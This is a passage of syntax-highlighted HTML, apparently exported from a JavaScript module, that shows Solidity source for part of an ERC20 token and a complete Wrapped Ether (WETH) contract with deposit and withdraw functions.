        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, to, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        <span class="hljs-keyword">uint256</span> allowed <span class="hljs-operator">=</span> allowance[<span class="hljs-keyword">from</span>][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        <span class="hljs-keyword">if</span> (allowed <span class="hljs-operator">!</span><span class="hljs-operator">=</span> <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>) {
            allowance[<span class="hljs-keyword">from</span>][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> allowed <span class="hljs-operator">-</span> amount;
        }
        balanceOf[<span class="hljs-keyword">from</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">from</span>, to, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_mint</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{
        totalSupply <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), to, amount);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_burn</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{
        balanceOf[<span class="hljs-keyword">from</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            totalSupply <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), amount);
    }
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./ERC20.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">WETH</span> <span class="hljs-keyword">is</span> <span class="hljs-title">ERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Deposit</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> account, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> account, <span class="hljs-keyword">uint256</span> amount</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title">ERC20</span>(<span class="hljs-params"><span class="hljs-string">"Wrapped Ether"</span>, <span class="hljs-string">"WETH"</span>, <span class="hljs-number">18</span></span>) </span>{}

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        deposit();
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        _mint(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
        <span class="hljs-keyword">emit</span> Deposit(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        _burn(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);
        <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>).<span class="hljs-built_in">transfer</span>(amount);
        <span class="hljs-keyword">emit</span> Withdraw(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);
    }
}
</code></pre>`

export default html
